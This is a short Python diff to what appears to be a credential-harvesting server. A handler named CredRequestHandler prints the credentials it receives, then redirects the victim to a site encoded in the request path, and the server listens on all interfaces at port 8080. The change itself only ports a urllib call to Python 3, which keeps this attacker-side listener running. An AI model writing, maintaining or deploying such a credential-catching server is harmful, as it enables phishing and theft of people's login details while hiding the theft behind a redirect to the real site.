@@ -9,7 +9,7 @@ class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
         print(creds)
         site=self.path[1:]
         self.send_response(301)
-        self.send_header('Location',urllib.unquote(site))
+        self.send_header('Location',urllib.parse.unquote(site))
         self.end_headers()
 
 server=socketserver.TCPServer(('0.0.0.0',8080),CredRequestHandler)
